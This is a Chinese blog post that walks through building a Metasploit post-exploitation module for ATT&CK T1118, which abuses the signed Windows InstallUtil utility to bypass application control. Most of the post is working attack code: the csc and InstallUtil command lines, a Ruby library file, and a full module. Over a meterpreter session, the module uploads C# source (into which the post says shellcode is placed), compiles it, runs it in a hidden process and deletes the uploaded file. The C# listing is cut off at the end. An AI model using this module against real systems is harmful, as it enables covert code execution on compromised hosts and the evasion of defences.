        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-tou.jpg" alt="4"><span id="more"></span></p><h2 id="1-T1118"><a href="#1-T1118" class="headerlink" title="1.T1118"></a>1.T1118</h2><p>攻击者可以使用InstallUtil通过受信任的Windows实用工具代理代码执行。InstallUtil是一个命令行实用程序，通过执行.NET二进制文件中指定的特定安装程序组件，允许安装和卸载资源。（引用：MSDN InstallUtil）InstallUtil由Microsoft数字签名，位于Windows系统上的.NET目录中：<code>C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe``C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe</code></p><p>通过在二进制文件中使用执行用属性装饰的类的属性，InstallUtil也可以用于绕过应用程序控制<code>[System.ComponentModel.RunInstaller(true)]</code></p><h2 id="2-T1118-POC"><a href="#2-T1118-POC" class="headerlink" title="2.T1118-POC"></a>2.T1118-POC</h2><p> <strong>InstallUtil HelpText方法调用</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-4.png" alt="4"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一步:</span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">csc.exe</span> /<span class="title">target:library</span> <span class="title">T1118.cs</span></span></span><br><span class="line"><span class="function">第二步:</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /<span class="title">U</span> /<span class="title">logfile</span>= /<span class="title">logtoconsole</span>=<span class="title">false</span> <span class="title">T1118.dll</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HelpText</span> 调用:</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /? <span class="title">T1118.dll</span></span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-5.png" alt="5"></p><h2 id="3-开始编写模块"><a href="#3-开始编写模块" class="headerlink" title="3.开始编写模块"></a>3.开始编写模块</h2><p><strong>思路流程：</strong></p><p>由于t1118属于后渗透阶段，我们为其在获取session会话的时候进行以下操作</p><p><strong>1.上传源代码。</strong></p><p><strong>2.csc编译dll</strong></p><p><strong>3.InstallUtil.exe调用加载dll</strong> </p><p>需要定义设置的参数：</p><p><strong>1.本地C#源码</strong></p><p><strong>2.上传windows的路径</strong></p><p><strong>3.dotnet的版本</strong></p><p>我们在**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;<strong>和&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;文件夹中新建一个文件夹本文命名为</strong>secist**，在这个文件夹中用于存放关于att&amp;ck相关的攻击模块。</p><p><strong>然后新建一个ruby文件，为其命名为t1118.rb。</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-6.png" alt="6"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-8.png" alt="6"></p><h3 id="3-1-初始化模块"><a href="#3-1-初始化模块" class="headerlink" title="3.1 初始化模块"></a>3.1 初始化模块</h3><p>参考官方编写模块 <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module">https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module</a> </p><p><strong>定义初始化info信息</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-7.png" alt="7"></p><p>设置参数</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">OptString</span>.new( <span class="string">&#x27;RFILE&#x27;</span>, [<span class="literal">false</span>, <span class="string">&#x27;上传到windows路径&#x27;</span>,<span class="string">&#x27;C:\\windows\\temp\\t1118.tmp&#x27;</span> ]),</span><br><span class="line"><span class="title class_">OptString</span>.new(<span class="string">&#x27;LFILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;本地t1118.cs路径&#x27;</span>, <span class="symbol">:</span><span class="symbol">:File</span>.join(Msf::Config.install_root, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;secist&quot;</span>, <span class="string">&quot;t1118&quot;</span>, <span class="string">&quot;t1118.cs&quot;</span>) ]),</span><br><span class="line"><span class="title class_">OptBool</span>.new(<span class="string">&#x27;CLEANUP_FILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&quot;清理文件&quot;</span>, <span class="literal">true</span>]),</span><br><span class="line"><span class="title class_">OptString</span>.new(<span class="string">&#x27;DOTNET_VERSION&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;DotNet Version&#x27;</span>,<span class="string">&#x27;v4.0.30319&#x27;</span> ]),</span><br></pre></td></tr></table></figure><p>定义使用run命令 执行的内容。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">&quot;meterpreter&quot;</span></span><br><span class="line">        print_good(<span class="string">&quot;模块T1118执行成功&quot;</span>)</span><br><span class="line">    <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">        print_status(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">        print_error(<span class="string">&quot;模块T1118执行失败&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="3-2-定义本地文件和上传文件"><a href="#3-2-定义本地文件和上传文件" class="headerlink" title="3.2  定义本地文件和上传文件"></a>3.2  定义本地文件和上传文件</h3><p><strong>定义remote_file和local_file 对 datastore[‘RFILE’]和 datastore[‘LFILE’]取值</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remote_file</span></span><br><span class="line">    <span class="keyword">if</span> datastore[<span class="string">&#x27;RFILE&#x27;</span>].blank?</span><br><span class="line">      remote_name = File.basename(datastore[<span class="string">&#x27;LFILE&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      remote_name = datastore[<span class="string">&#x27;RFILE&#x27;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    remote_name</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local_file</span></span><br><span class="line">      datastore[<span class="string">&#x27;LFILE&#x27;</span>]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-3-删除上传的源代码"><a href="#3-3-删除上传的源代码" class="headerlink" title="3.3 删除上传的源代码"></a>3.3 删除上传的源代码</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span></span><br><span class="line">      print_status(<span class="string">&quot;Removing files...&quot;</span>)</span><br><span class="line">      register_file_for_cleanup(datastore[<span class="string">&#x27;RFILE&#x27;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="3-3定义cmd的命令"><a href="#3-3定义cmd的命令" class="headerlink" title="3.3定义cmd的命令"></a>3.3定义cmd的命令</h3><p>使用run_cmd 运行命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_cmd</span>(<span class="params">user_cmd,io=<span class="literal">true</span></span>)</span><br><span class="line">    cmd = <span class="string">&quot;cmd /c <span class="subst">#&#123;user_cmd&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      print_status(<span class="string">&quot;Executing &#x27;<span class="subst">#&#123;cmd&#125;</span>&#x27; on <span class="subst">#&#123;session.inspect&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">if</span> io</span><br><span class="line">        res = cmd_exec(cmd)</span><br><span class="line">        <span class="keyword">if</span> res</span><br><span class="line">          print_warning(res)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        res = session.sys.process.execute(cmd, <span class="literal">nil</span>, &#123;<span class="string">&#x27;Hidden&#x27;</span> =&gt; <span class="literal">true</span>&#125;)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">      print_error(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="3-4上传文件和命令执行"><a href="#3-4上传文件和命令执行" class="headerlink" title="3.4上传文件和命令执行"></a>3.4上传文件和命令执行</h3><p>该步骤为以下内容</p><p>1.上传本地的**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;secist&#x2F;t1118&#x2F;t1118.cs<strong>文件到</strong>C:\windows\temp\t1118.tmp**</p><p><strong>2.使用csc.exe 对t1118.tmp 进行编译</strong></p><p><strong>3.使用InstallUtil对编译后的dll进行调用</strong></p><p><strong>4.删除源文件</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">&quot;meterpreter&quot;</span></span><br><span class="line">            rfile = remote_file()</span><br><span class="line">            lfile = local_file()</span><br><span class="line">            dotnet_version = datastore[<span class="string">&#x27;DOTNET_VERSION&#x27;</span>]</span><br><span class="line">            base = <span class="string">&#x27;C:\Windows\Microsoft.NET\Framework&#x27;</span></span><br><span class="line">          </span><br><span class="line">            csc = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;csc.exe&#x27;</span></span><br><span class="line">            installutil = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;installutil.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">            upload_file(rfile, lfile)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;csc&#125;</span> /out:C:\\windows\\temp\\t1118.dll <span class="subst">#&#123;rfile&#125;</span>)</span></span><br><span class="line">            print_status(<span class="string">&quot;Compiling...&quot;</span>)</span><br><span class="line">            run_cmd(cmd)</span><br><span class="line"><span class="comment">#C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library T1118.cs</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;installutil&#125;</span> /logfile= /LogToConsole=false /U C:\\windows\\temp\\t1118.dll&quot;)</span></span><br><span class="line">        <span class="comment">#C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false T1118.dll    </span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            print_status(<span class="string">&quot;Executing InstallUtil...&quot;</span>)</span><br><span class="line">            run_cmd(cmd,<span class="literal">false</span>)</span><br><span class="line">            print_good(<span class="string">&quot;模块T1118执行成功&quot;</span>)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            clean_file()</span><br><span class="line">            print_good(<span class="string">&quot;清理缓存成功&quot;</span>)</span><br><span class="line">        <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">            print_status(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">            print_error(<span class="string">&quot;模块T1118执行失败&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong>t1118整体加载模块初始设置</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-1.png" alt="1"></p><p><strong>poc 运行后</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-2.png" alt="2"></p><p><strong>poc 填入shellcode 运行后</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-.png" alt="xj"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-xj.png" alt="xj"></p><p><strong>demo演示</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com//msft1118.gif" alt="msft1118"></p><h2 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h2><p><strong>添加库路径&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;post&#x2F;windows.rb</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core/post/windows/secist&#x27;</span></span><br></pre></td></tr></table></figure><p>定义库文件**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;post&#x2F;windows&#x2F;secist.rb**</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: binary -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> Msf</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Post</span></span><br><span class="line"><span class="keyword">module</span> Windows</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> Secist</span><br><span class="line"></span><br><span class="line">    <span class="comment">#上传文件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remote_file</span></span><br><span class="line">      <span class="keyword">if</span> datastore[<span class="string">&#x27;RFILE&#x27;</span>].blank?</span><br><span class="line">        remote_name = File.basename(datastore[<span class="string">&#x27;LFILE&#x27;</span>])</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        remote_name = datastore[<span class="string">&#x27;RFILE&#x27;</span>]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">      remote_name</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#本地文件</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">local_file</span></span><br><span class="line">        datastore[<span class="string">&#x27;LFILE&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#清理文件</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">clean_file</span></span><br><span class="line">        print_status(<span class="string">&quot;Removing files...&quot;</span>)</span><br><span class="line">        register_file_for_cleanup(datastore[<span class="string">&#x27;RFILE&#x27;</span>])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#运行cmd 命令</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">run_cmd</span>(<span class="params">user_cmd,io=<span class="literal">true</span></span>)</span><br><span class="line">      cmd = <span class="string">&quot;cmd /c <span class="subst">#&#123;user_cmd&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">begin</span></span><br><span class="line">        print_status(<span class="string">&quot;Executing &#x27;<span class="subst">#&#123;cmd&#125;</span>&#x27; on <span class="subst">#&#123;session.inspect&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> io</span><br><span class="line">          res = cmd_exec(cmd)</span><br><span class="line">          <span class="keyword">if</span> res</span><br><span class="line">            print_warning(res)</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          res = session.sys.process.execute(cmd, <span class="literal">nil</span>, &#123;<span class="string">&#x27;Hidden&#x27;</span> =&gt; <span class="literal">true</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">        print_error(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># secist</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># Windows</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># Post</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># Msf</span></span><br></pre></td></tr></table></figure><p>模块文件 <strong>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;secist&#x2F;t1118.rb</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Post</span></span><br><span class="line">    <span class="keyword">include</span> Msf::Post::File</span><br><span class="line">    <span class="keyword">include</span> Exploit::FileDropper</span><br><span class="line">    <span class="keyword">include</span> Post::Windows::Secist</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">      <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">                        <span class="string">&#x27;Name&#x27;</span>          =&gt; <span class="string">&#x27;InstallUtil (T1118) Windows&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;Description&#x27;</span>   =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">                        ATT&amp;CK 模块编写 T1118  &#125;</span>,</span><br><span class="line">                        <span class="string">&#x27;License&#x27;</span>       =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">                        <span class="string">&#x27;Author&#x27;</span>        =&gt; [ <span class="string">&#x27;Secist-demon&#x27;</span> ],</span><br><span class="line">                        <span class="string">&#x27;References&#x27;</span>    =&gt; [ [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://attack.mitre.org/wiki/Technique/T1118&#x27;</span> ],</span><br><span class="line">                        [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1118&#x27;</span> ],</span><br><span class="line">                        [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260&#x27;</span>  ],</span><br><span class="line">                        [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb&#x27;</span> ] ],</span><br><span class="line">                        <span class="string">&#x27;Platform&#x27;</span>      =&gt; [ <span class="string">&#x27;win&#x27;</span> ],</span><br><span class="line">                        <span class="string">&#x27;SessionTypes&#x27;</span>  =&gt; [ <span class="string">&#x27;meterpreter&#x27;</span> ]</span><br><span class="line">                       ))</span><br><span class="line">      register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">OptString</span>.new( <span class="string">&#x27;RFILE&#x27;</span>, [<span class="literal">false</span>, <span class="string">&#x27;上传到windows路径&#x27;</span>,<span class="string">&#x27;C:\\windows\\temp\\t1118.tmp&#x27;</span> ]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;LFILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;本地t1118.cs路径&#x27;</span>, <span class="symbol">:</span><span class="symbol">:File</span>.join(Msf::Config.install_root, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;secist&quot;</span>, <span class="string">&quot;t1118&quot;</span>, <span class="string">&quot;t1118.cs&quot;</span>) ]),</span><br><span class="line">        <span class="title class_">OptBool</span>.new(<span class="string">&#x27;CLEANUP_FILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&quot;清理文件&quot;</span>, <span class="literal">true</span>]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;DOTNET_VERSION&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;DotNet Version&#x27;</span>,<span class="string">&#x27;v4.0.30319&#x27;</span> ]),</span><br><span class="line">      ])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">&quot;meterpreter&quot;</span></span><br><span class="line">            rfile = remote_file()</span><br><span class="line">            lfile = local_file()</span><br><span class="line">            dotnet_version = datastore[<span class="string">&#x27;DOTNET_VERSION&#x27;</span>]</span><br><span class="line">            base = <span class="string">&#x27;C:\Windows\Microsoft.NET\Framework&#x27;</span></span><br><span class="line">          </span><br><span class="line">            csc = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;csc.exe&#x27;</span></span><br><span class="line">            installutil = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;installutil.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">            upload_file(rfile, lfile)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;csc&#125;</span> /out:C:\\windows\\temp\\t1118.dll <span class="subst">#&#123;rfile&#125;</span>)</span></span><br><span class="line">            print_status(<span class="string">&quot;Compiling...&quot;</span>)</span><br><span class="line">            run_cmd(cmd)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;installutil&#125;</span> /logfile= /LogToConsole=false /U C:\\windows\\temp\\t1118.dll&quot;)</span></span><br><span class="line">            print_status(<span class="string">&quot;Executing InstallUtil...&quot;</span>)</span><br><span class="line">            run_cmd(cmd,<span class="literal">false</span>)</span><br><span class="line">            print_good(<span class="string">&quot;模块T1118执行成功&quot;</span>)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            clean_file()</span><br><span class="line">            print_good(<span class="string">&quot;清理缓存成功&quot;</span>)</span><br><span class="line">        <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">            print_status(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">            print_error(<span class="string">&quot;模块T1118执行失败&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>T1118.cs</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 